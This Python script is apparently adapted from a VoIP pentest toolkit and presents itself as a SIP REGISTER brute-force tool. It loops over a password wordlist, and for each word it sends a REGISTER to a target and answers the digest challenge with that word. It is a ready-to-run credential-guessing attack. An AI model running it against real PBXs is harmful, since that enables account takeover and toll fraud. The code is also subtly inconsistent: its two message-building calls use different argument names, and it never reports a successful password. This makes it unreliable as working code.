#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import sys
import argparse
import ssl
from lib.functions import (
    create_message,
    get_free_port,
    parse_message,
    parse_digest,
    generate_random_string,
    calculateHash,
    get_machine_default_ip,
)
from lib.color import Color
from lib.logos import Logo


class SipRegisterBf:
    def __init__(self):
        # Essential variables for REGISTER method
        self.ip = ""
        self.host = ""
        self.template = ""
        self.proxy = ""
        self.route = ""
        self.rport = "5060"
        self.lport = ""
        self.proto = "UDP"
        self.method = "REGISTER"
        self.domain = ""
        self.contact_domain = ""
        self.from_user = "100"
        self.from_name = ""
        self.from_domain = ""
        self.from_tag = ""
        self.to_user = ""
        self.to_name = ""
        self.to_domain = ""
        self.user = ""
        self.pwd = ""
        self.user_agent = "pplsip"
        self.digest = ""
        self.branch = ""
        self.callid = ""
        self.cseq = "1"
        self.localip = ""
        self.header = ""
        self.nocontact = 0
        self.timeout = 5
        self.verbose = 0

        self.withcontact = 1

        self.c = Color()

    def start(self):
        supported_protos = ["UDP", "TCP", "TLS"]
        self.method = "REGISTER"
        self.proto = self.proto.upper()

        if self.nocontact == 1:
            self.withcontact = 0

        # Get local IP address
        if not self.localip:
            try:
                self.localip = get_machine_default_ip()
            except Exception:
                print(f"{self.c.BRED}Error getting local IP")
                print(
                    f"{self.c.BWHITE}Try with {self.c.BYELLOW}-local-ip{self.c.BWHITE} param"
                )
                print(self.c.WHITE)
                exit()

        # Adjust default port for TLS
        if self.rport == "5060" and self.proto == "TLS":
            self.rport = "5061"

        # Check protocol
        if self.proto not in supported_protos:
            print(f"{self.c.BRED}Protocol {self.proto} is not supported")
            print(self.c.WHITE)
            sys.exit()

        # Create socket
        try:
            if self.proto == "UDP":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print(f"{self.c.RED}Failed to create socket")
            print(self.c.WHITE)
            sys.exit(1)

        # Display logo and target information
        logo = Logo("sipsend")
        logo.print()

        print(
            f"{self.c.BWHITE}[✓] Target: {self.c.GREEN}{self.ip}{self.c.WHITE}:{self.c.GREEN}{self.rport}{self.c.WHITE}/{self.c.GREEN}{self.proto}"
        )
        if self.proxy:
            print(
                f"{self.c.BWHITE}[✓] Outbound Proxy: {self.c.GREEN}{self.proxy}"
            )
        if self.template:
            print(f"{self.c.BWHITE}[✓] Template: {self.c.GREEN}{self.template}")
        if (
            self.domain
            and self.domain != str(self.ip)
            and self.domain != self.host
        ):
            print(
                f"{self.c.BWHITE}[✓] Customized Domain: {self.c.GREEN}{self.domain}"
            )
        if self.contact_domain:
            print(
                f"{self.c.BWHITE}[✓] Customized Contact Domain: {self.c.GREEN}{self.contact_domain}"
            )
        if self.from_name:
            print(
                f"{self.c.BWHITE}[✓] Customized From Name: {self.c.GREEN}{self.from_name}"
            )
        if self.from_user != "100":
            print(
                f"{self.c.BWHITE}[✓] Customized From User: {self.c.GREEN}{self.from_user}"
            )
        if self.from_domain:
            print(
                f"{self.c.BWHITE}[✓] Customized From Domain: {self.c.GREEN}{self.from_domain}"
            )
        if self.from_tag:
            print(
                f"{self.c.BWHITE}[✓] Customized From Tag: {self.c.GREEN}{self.from_tag}"
            )
        if self.to_name:
            print(
                f"{self.c.BWHITE}[✓] Customized To Name: {self.c.GREEN}{self.to_name}"
            )
        if self.to_user:
            print(
                f"{self.c.BWHITE}[✓] Customized To User: {self.c.GREEN}{self.to_user}"
            )
        if self.to_domain:
            print(
                f"{self.c.BWHITE}[✓] Customized To Domain: {self.c.GREEN}{self.to_domain}"
            )
        if self.user_agent != "pplsip":
            print(
                f"{self.c.BWHITE}[✓] Customized User-Agent: {self.c.GREEN}{self.user_agent}"
            )
        print(self.c.WHITE)
        # Output to file if specified

        # Generate necessary SIP headers
        if not self.branch:
            self.branch = generate_random_string(71, 71, "ascii")
        if not self.callid:
            self.callid = generate_random_string(32, 32, "hex")
        if not self.from_tag:
            self.from_tag = generate_random_string(8, 8, "hex")

        if not self.cseq:
            self.cseq = "1"

        if self.user and self.pwd and self.from_user == "100":
            self.from_user = self.user

        bind = "0.0.0.0"

        # Determine local port
        if not self.lport:
            lport = get_free_port()
        else:
            lport = self.lport

        # Bind socket
        try:
            print("binding")
            sock.bind((bind, lport))
        except Exception:
            lport = get_free_port()
            sock.bind((bind, lport))

        # Set target host
        if not self.proxy:
            host = (str(self.ip), int(self.rport))
        else:
            if ":" in self.proxy:
                proxy_ip, proxy_port = self.proxy.split(":")
            else:
                proxy_ip = self.proxy
                proxy_port = "5060"
            host = (str(proxy_ip), int(proxy_port))

        # Set domains
        if self.host and not self.domain:
            self.domain = self.host
        if not self.domain:
            self.domain = self.ip
        if not self.from_domain:
            self.from_domain = self.domain
        if not self.to_domain:
            self.to_domain = self.domain

        if not self.contact_domain:
            self.contact_domain = self.localip

        if self.proxy:
            self.route = f"<sip:{self.proxy};lr>"

        # Create SIP message
        if self.template:
            msg = ""
            with open(self.template, "r") as tf:
                for line in tf:
                    msg += line.replace("\n", "\r\n")
            msg += "\r\n"
        else:
            if not self.to_user and self.from_user:
                self.to_user = self.from_user
            if self.to_user and not self.from_user:
                self.from_user = self.to_user

            msg = create_message(
                method=self.method,
                ip_sdp=self.localip,
                contactdomain=self.contact_domain,
                fromuser=self.from_user,
                fromname=self.from_name,
                fromdomain=self.from_domain,
                touser=self.to_user,
                toname=self.to_name,
                todomain=self.to_domain,
                proto=self.proto,
                domain=self.domain,
                useragent=self.user_agent,
                fromport=lport,
                branch=self.branch,
                callid=self.callid,
                tag=self.from_tag,
                cseq=self.cseq,
                totag="",
                digest=self.digest,
                auth_type=1,
                referto="",  # Assuming this is an empty string or provide the correct value
                withsdp=0,
                via="",
                rr=self.route,
                ppi="",  # Assuming this is an empty string or provide the correct value
                pai="",  # Assuming this is an empty string or provide the correct value
                header=self.header,
                withcontact=self.withcontact,
            )
            print(msg)

        try:
            sock.settimeout(self.timeout)

            if self.proto == "TCP":
                sock.connect(host)

            if self.proto == "TLS":
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.load_default_certs()

                sock_ssl = context.wrap_socket(
                    sock, server_hostname=str(host[0])
                )
                sock_ssl.connect(host)
                sock_ssl.sendall(msg.encode("utf-8"))
            else:
                sock.sendto(msg.encode("utf-8"), host)

            # Sending initial REGISTER request
            if self.verbose == 1:
                print(
                    f"{self.c.BWHITE}[+] Sending to {self.ip}:{self.rport}/{self.proto} ..."
                )
                print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
            else:
                print(f"{self.c.BYELLOW}[=>] Request {self.method}")

            rescode = "100"

            # Receive response
            while rescode.startswith("1"):
                if self.proto == "TLS":
                    resp = sock_ssl.recv(4096)
                else:
                    resp = sock.recv(4096)

                headers = parse_message(resp.decode())

                if headers:
                    response = (
                        f"{headers['response_code']} {headers['response_text']}"
                    )
                    rescode = headers["response_code"]
                    if self.verbose == 1:
                        print(
                            f"{self.c.BWHITE}[-] Receiving from {self.ip}:{self.rport}/{self.proto} ..."
                        )
                        print(f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}")
                    else:
                        print(f"{self.c.BGREEN}[<=] Response {response}")

            # Handle authentication if required
            if self.user and self.pwd and rescode in ["401", "407"]:
                if headers.get("auth"):
                    auth = headers["auth"]
                    auth_type = headers["auth-type"]
                    auth_headers = parse_digest(auth)
                    realm = self.domain
                    nonce = auth_headers["nonce"]
                    uri = f"sip:{self.domain}"
                    algorithm = auth_headers["algorithm"]
                    cnonce = auth_headers.get("cnonce", "")
                    nc = auth_headers.get("nc", "")
                    qop = auth_headers.get("qop", "")

                    if qop and not cnonce:
                        cnonce = generate_random_string(8, 8, "ascii")
                    if qop and not nc:
                        nc = "00000001"

                    response_hash = calculateHash(
                        self.user,
                        realm,
                        self.pwd,
                        self.method,
                        uri,
                        nonce,
                        algorithm,
                        cnonce,
                        nc,
                        qop,
                        0,
                        "",
                    )

                    digest = (
                        f'Digest username="{self.user}", realm="{realm}", nonce="{nonce}", uri="{uri}", '
                        f'response="{response_hash}", algorithm={algorithm}'
                    )
                    if qop:
                        digest += f", qop={qop}"
                    if cnonce:
                        digest += f', cnonce="{cnonce}"'
                    if nc:
                        digest += f", nc={nc}"

                    self.branch = generate_random_string(71, 71, "ascii")
                    self.cseq = str(int(self.cseq) + 1)

                    # Create authenticated REGISTER message
                    msg = create_message(
                        method=self.method,
                        local_ip=self.localip,
                        contact_domain=self.contact_domain,
                        from_user=self.from_user,
                        from_name=self.from_name,
                        from_domain=self.from_domain,
                        to_user=self.to_user,
                        to_name=self.to_name,
                        to_domain=self.to_domain,
                        proto=self.proto,
                        domain=self.domain,
                        user_agent=self.user_agent,
                        lport=lport,
                        branch=self.branch,
                        call_id=self.callid,
                        from_tag=self.from_tag,
                        cseq=self.cseq,
                        to_tag="",
                        digest=digest,
                        auth_type=auth_type,
                        body="",
                        sdp=0,
                        via_address="",
                        route=self.route,
                        header=self.header,
                        with_contact=self.withcontact,
                    )

                    # Send authenticated REGISTER
                    try:
                        if self.proto == "TLS":
                            sock_ssl.sendall(msg.encode("utf-8"))
                        else:
                            sock.sendto(msg.encode("utf-8"), host)

                        if self.verbose == 1:
                            print(
                                f"{self.c.BWHITE}[+] Sending to {self.ip}:{self.rport}/{self.proto} ..."
                            )
                            print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
                        else:
                            print(
                                f"{self.c.BYELLOW}[=>] Request {self.method} (AUTH)"
                            )

                        # Receive response to authenticated REGISTER
                        rescode = "100"
                        while rescode.startswith("1"):
                            if self.proto == "TLS":
                                resp = sock_ssl.recv(4096)
                            else:
                                resp = sock.recv(4096)

                            headers = parse_message(resp.decode())

                            if headers and headers.get("response_code"):
                                response = f"{headers['response_code']} {headers['response_text']}"
                                rescode = headers["response_code"]
                                if self.verbose == 1:
                                    print(
                                        f"{self.c.BWHITE}[-] Receiving from {self.ip}:{self.rport}/{self.proto} ..."
                                    )
                                    print(
                                        f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}"
                                    )
                                else:
                                    print(
                                        f"{self.c.BGREEN}[<=] Response {response}"
                                    )

                    except Exception:
                        print(self.c.WHITE)

        except socket.timeout:
            pass
        except Exception:
            print(f"{self.c.RED}[!] Socket connection error\n{self.c.WHITE}")
        finally:
            sock.close()


def main():
    parser = argparse.ArgumentParser(
        description="SIP Register Bruteforce Script"
    )
    parser.add_argument("--proxy", required=True, help="Proxy IP address")
    parser.add_argument("--rport", required=True, help="Remote port")
    parser.add_argument(
        "--proto", required=True, help="Protocol (e.g., TCP, UDP)"
    )
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--from_domain", required=True, help="From domain")
    parser.add_argument("--user", required=True, help="User")
    parser.add_argument("--from_user", required=True, help="From user")
    parser.add_argument(
        "--wordlist", required=True, help="Path to the wordlist file"
    )

    args = parser.parse_args()

    sipregister = SipRegisterBf()
    sipregister.proxy = args.proxy
    sipregister.rport = args.rport
    sipregister.proto = args.proto
    sipregister.ip = args.ip
    sipregister.from_domain = args.from_domain
    sipregister.user = args.user
    sipregister.from_user = args.from_user

    with open(args.wordlist, "r") as file:
        for line in file:
            sipregister.pwd = line.strip()
            try:
                sipregister.start()
            except Exception as e:
                print(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
